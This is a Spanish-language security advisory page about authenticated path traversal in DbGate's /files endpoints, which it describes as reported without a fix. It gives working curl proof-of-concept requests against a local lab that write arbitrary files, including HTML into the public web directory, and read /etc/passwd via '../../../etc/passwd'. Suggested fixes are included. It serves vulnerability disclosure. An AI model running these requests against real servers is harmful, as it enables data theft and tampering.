@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DbGate: lectura y escritura arbitrarias en /files | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre lectura y escritura arbitrarias de archivos en endpoints /files autenticados de DbGate." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/dbgate-files-arbitrary-read-write.html" />
+  <meta property="og:title" content="DbGate: lectura y escritura arbitrarias en /files" />
+  <meta property="og:description" content="Investigación sobre lectura y escritura arbitrarias de archivos en endpoints /files autenticados de DbGate." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/dbgate-files-arbitrary-read-write.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="DbGate: lectura y escritura arbitrarias en /files" />
+  <meta name="twitter:description" content="Lectura y escritura arbitrarias autenticadas en endpoints /files de DbGate." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / dbgate</p>
+      <h1>Arbitrary file read/write in /files<span>_</span></h1>
+        <div class="writeup-meta"><span>High</span><span>Arbitrary file read/write</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">DbGate</span><span class="tag">Arbitrary File Write</span><span class="tag">Arbitrary File Read</span><span class="tag">Path Traversal</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> la validación se realizó contra un build local de DbGate master / <code>7.2.4-packer-beta.3</code>. Los ejemplos utilizan únicamente un laboratorio Docker controlado. El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-8x25-5rvx-jvhp</code>; el maintainer no respondió y no hay versión corregida publicada.</p></blockquote>
+
+        <p>Durante la revisión de DbGate encontré varios endpoints web expuestos bajo <code>/files</code> que confiaban en rutas controladas por el cliente y las pasaban directamente a operaciones como <code>fs.writeFile</code>, <code>fs.copyFile</code> y <code>fs.readFile</code>.</p>
+
+        <p>El caso más grave era <code>POST /files/export-diagram-png</code>, que permitía a cualquier usuario autenticado proporcionar tanto la ruta de destino como el contenido del archivo. En un despliegue web/server esto creaba una primitiva de escritura arbitraria en el filesystem del servidor, limitada únicamente por los permisos del proceso de DbGate.</p>
+
+        <p>También confirmé primitivas de lectura arbitraria autenticada mediante <code>/files/download-text</code> y <code>/files/export-file</code>. En el laboratorio, ambas permitieron leer <code>/etc/passwd</code>. La escritura también pudo alcanzar un directorio web público y servir contenido controlado desde el mismo origen de DbGate.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>DbGate</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/dbgate/dbgate" target="_blank" rel="noopener noreferrer">github.com/dbgate/dbgate</a></td></tr>
+            <tr><td>Reporte enviado</td><td>24 de julio de 2026</td></tr>
+            <tr><td>Paquete</td><td><code>dbgate</code> (npm)</td></tr>
+            <tr><td>Versión probada</td><td>master / <code>7.2.4-packer-beta.3</code></td></tr>
+            <tr><td>Versiones afectadas</td><td><code>&lt;= 7.2.4-packer-beta.3</code></td></tr>
+            <tr><td>Versiones corregidas</td><td>Ninguna publicada</td></tr>
+            <tr><td>Componente</td><td><code>packages/api/src/controllers/files.js</code></td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Vulnerabilidades</td><td>Arbitrary file write / arbitrary file read</td></tr>
+            <tr><td>Triage</td><td>High</td></tr>
+            <tr><td>GHSA</td><td><code>GHSA-8x25-5rvx-jvhp</code></td></tr>
+            <tr><td>Estado</td><td>No response / sin parche publicado</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Endpoints afectados</h2>
+        <ul>
+          <li><code>POST /files/export-diagram-png</code></li>
+          <li><code>POST /files/export-chart</code></li>
+          <li><code>POST /files/export-map</code></li>
+          <li><code>POST /files/export-diagram</code></li>
+          <li><code>POST /files/export-file</code></li>
+          <li><code>POST /files/download-text</code></li>
+        </ul>
+
+        <p>El endpoint relacionado <code>POST /files/get-file-real-path</code> también parecía carecer de una validación de ruta equivalente. Por sí solo es de menor severidad, pero puede revelar rutas absolutas del servidor y ayudar a combinar las primitivas de lectura y escritura.</p>
+
+        <h2>Escritura arbitraria mediante export-diagram-png</h2>
+        <p>La implementación más grave era:</p>
+        <pre><code>async exportDiagramPng({ filePath, pngBase64 }) {
+  const base64 = pngBase64.replace(/^data:image\/png;base64,/, '');
+  await fs.writeFile(filePath, Buffer.from(base64, 'base64'));
+  return true;
+}</code></pre>
+
+        <p>El endpoint no realizaba:</p>
+        <ul>
+          <li>Comprobación exclusiva para Electron.</li>
+          <li>Comprobación de permisos específica.</li>
+          <li>Validación de la ruta en el servidor.</li>
+          <li>Restricción a un directorio aprobado de exportación o upload.</li>
+          <li>Validación de que el contenido decodificado fuera realmente un PNG.</li>
+        </ul>
+
+        <p>Por tanto, un usuario autenticado podía controlar los dos elementos de la operación:</p>
+        <pre><code>filePath  → destino controlado por el atacante
+pngBase64 → bytes controlados por el atacante
+                ↓
+          fs.writeFile()</code></pre>
+
+        <p>El mismo patrón aparecía en <code>exportChart</code>, <code>exportMap</code> y <code>exportDiagram</code>, que escribían en un <code>filePath</code> proporcionado por el cliente.</p>
+
+        <h2>Lectura mediante export-file</h2>
+        <p>La implementación de <code>exportFile</code> era:</p>
+        <pre><code>async exportFile({ folder, file, filePath }, req) {
+  const loadedPermissions = await loadPermissionsFromRequest(req);
+  if (!hasPermission(`files/${folder}/read`, loadedPermissions)) return false;
+  await fs.copyFile(path.join(filesdir(), folder, file), filePath);
+  return true;
+}</code></pre>
+
+        <p>Aunque comprobaba un permiso sobre la carpeta, <code>folder</code>, <code>file</code> y <code>filePath</code> estaban controlados por la solicitud. El origen se construía con <code>path.join(filesdir(), folder, file)</code>, pero no se aplicaba la misma validación <code>checkSecureFilePathsWithoutDirectory</code> utilizada por operaciones como delete, rename, copy, load y save.</p>
+
+        <p>Esto permitía usar traversal en el origen, copiar un archivo accesible para Node.js a una ubicación legible por la aplicación y recuperarlo después mediante <code>/files/load</code>:</p>
+        <pre><code>folder = "."
+file   = "../../../etc/passwd"
+        ↓
+filesdir() / . / ../../../etc/passwd
+        ↓
+archivo copiado a una carpeta de aplicación
+        ↓
+files/load devuelve el contenido</code></pre>
+
+        <h2>Lectura directa mediante download-text</h2>
+        <p>La ruta <code>/files/download-text</code> ofrecía una primitiva de lectura más directa:</p>
+        <pre><code>async downloadText({ uri }, req) {
+  if (!uri) return null;
+  const filePath = await dbgateApi.download(uri);
+  const text = await fs.readFile(filePath, {
+    encoding: 'utf-8',
+  });
+  return text;
+}</code></pre>
+
+        <p>El helper de descarga trataba de forma especial las URIs <code>http://</code>, <code>https://</code> y <code>zip://</code>. Para cualquier otro valor devolvía la entrada sin modificar. Por eso una petición con <code>{"uri":"/etc/passwd"}</code> hacía que <code>downloadText</code> pasara directamente esa ruta a <code>fs.readFile</code>.</p>
+
+        <h2>Patrones más seguros en el mismo controlador</h2>
+        <p>El comportamiento era inconsistente con otras funciones del controlador. Operaciones como <code>saveAs</code> y <code>loadFrom</code> estaban protegidas con un guard exclusivo para Electron, mientras que <code>simpleCopy</code> validaba directorios mediante <code>checkSecureDirectories</code> en contextos server/non-Electron.</p>
+
+        <p>La diferencia mostraba que ya existían patrones de protección en el mismo componente, pero no se aplicaban de forma uniforme a los endpoints web expuestos.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La reproducción utilizó la imagen local <code>dbgate-lab</code> y el usuario normal <code>hunter</code>. El host de los ejemplos es <code>127.0.0.1:3100</code> y no representa una instalación pública.</p>
+
+        <h3>1. Autenticación</h3>
+        <pre><code>BASE="http://127.0.0.1:3100"
+
+JWT=$(curl -s -X POST "$BASE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"amoid":"logins","login":"hunter","password":"hunter"}' \
+  | jq -r '.accessToken')</code></pre>
+
+        <p>El usuario normal se autenticó correctamente y recibió un JWT:</p>
+        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code></pre>
+
+        <h3>2. Escritura arbitraria</h3>
+        <p>Primero escribí contenido controlado en un archivo temporal:</p>
+        <pre><code>PAYLOAD_B64=$(printf 'PWNED-DBGATE-LAB\n' | base64 -w0)
+
+curl -s -X POST "$BASE/files/export-diagram-png" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d "{
+    \"filePath\": \"/tmp/dbgate_poc_written.txt\",
+    \"pngBase64\": \"$PAYLOAD_B64\"
+  }"</code></pre>
+
+        <p>La respuesta fue <code>true</code> y el contenido apareció en el filesystem del contenedor:</p>
+        <pre><code>docker exec dbgate-lab sh -lc \
+  'ls -l /tmp/dbgate_poc_written.txt &amp;&amp; cat /tmp/dbgate_poc_written.txt'
+
+PWNED-DBGATE-LAB</code></pre>
+
+        <h3>3. Escritura en el directorio web público</h3>
+        <p>Para demostrar el alcance de la escritura, utilicé HTML sintético como contenido y lo dirigí al directorio público del laboratorio:</p>
+        <pre><code>&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;h1&gt;DBGATE-ARBITRARY-FILE-WRITE-POC-ZSZSEC&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <pre><code>HTML_B64=$(base64 -w0 /tmp/zszsec-poc.html)
+
+curl -s -X POST "$BASE/files/export-diagram-png" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d "{
+    \"filePath\": \"/home/dbgate-docker/public/zszsec-poc.html\",
+    \"pngBase64\": \"$HTML_B64\"
+  }"</code></pre>
+
+        <p>El archivo escrito pudo recuperarse desde el origen de DbGate:</p>
+        <pre><code>curl -i "$BASE/zszsec-poc.html"
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8</code></pre>
+
+        <p>Esto confirmó que un usuario autenticado podía modificar contenido web accesible desde el mismo origen.</p>
+
+        <h3>4. Lectura mediante export-file</h3>
+        <p>Primero preparé una carpeta legible por la aplicación:</p>
+        <pre><code>curl -s -X POST "$BASE/files/save" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "folder": "exfil",
+    "file": "placeholder.txt",
+    "data": "placeholder",
+    "format": "text"
+  }'</code></pre>
+
+        <p>Después utilicé traversal en el origen de <code>export-file</code> y recuperé la copia mediante <code>files/load</code>:</p>
+        <pre><code>curl -s -X POST "$BASE/files/export-file" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "folder": ".",
+    "file": "../../../etc/passwd",
+    "filePath": "/root/.dbgate/files/exfil/passwd_copy.txt"
+  }'
+
+curl -s -X POST "$BASE/files/load" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "folder": "exfil",
+    "file": "passwd_copy.txt",
+    "format": "text"
+  }'</code></pre>
+
+        <p>La respuesta contenía el archivo copiado:</p>
+        <pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin</code></pre>
+
+        <h3>5. Lectura directa mediante download-text</h3>
+        <pre><code>curl -s -X POST "$BASE/files/download-text" \
+  -H "Authorization: Bearer $JWT" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "uri": "/etc/passwd"
+  }'</code></pre>
+
+        <p>La respuesta devolvió directamente el contenido de <code>/etc/passwd</code>, confirmando la lectura arbitraria local autenticada.</p>
+
+        <h2>Impacto</h2>
+        <p>Un usuario autenticado normal podía leer y escribir archivos del servidor fuera de lo que debería controlar la aplicación, limitado por los permisos del proceso de DbGate.</p>
+
+        <p>La escritura arbitraria permitía colocar contenido controlado en cualquier ruta escribible. En el laboratorio se pudo escribir HTML/JavaScript en el directorio web público y servirlo desde el mismo origen, lo que podía permitir modificar contenido web o introducir JavaScript same-origin persistente según el despliegue.</p>
+
+        <p>La lectura podía realizarse directamente con <code>/files/download-text</code> o mediante la cadena <code>export-file</code> → <code>files/load</code>. En el laboratorio ambas rutas permitieron leer <code>/etc/passwd</code>.</p>
+
+        <p>El impacto final depende de los permisos del filesystem y de la topología del despliegue. Como mínimo, se exponían capacidades no previstas de lectura y escritura server-side a cualquier usuario autenticado. En instalaciones menos restringidas, esto puede permitir divulgar secretos, modificar contenido servido, corromper datos o alcanzar ejecución de código si se pueden sobrescribir archivos ejecutables de la aplicación.</p>
+
+        <h2>Corrección sugerida</h2>
+        <ul>
+          <li>Aplicar validación server-side de rutas a todos los endpoints web de <code>/files</code>.</li>
+          <li>Restringir las operaciones a directorios de exportación o upload aprobados.</li>
+          <li>Resolver y canonicalizar la ruta antes de verificar que permanezca dentro del directorio permitido.</li>
+          <li>Rechazar traversal en <code>folder</code>, <code>file</code>, <code>filePath</code> y <code>uri</code>.</li>
+          <li>Aplicar guards de entorno y permisos de manera uniforme en los endpoints server/non-Electron.</li>
+          <li>Validar el tipo y contenido de los archivos exportados, sin confiar únicamente en el nombre o en una extensión.</li>
+          <li>Añadir pruebas de regresión para lectura, escritura, copia y rutas con traversal en todos los endpoints afectados.</li>
+        </ul>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-8x25-5rvx-jvhp</code>. El maintainer no respondió y no hay versión corregida publicada.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
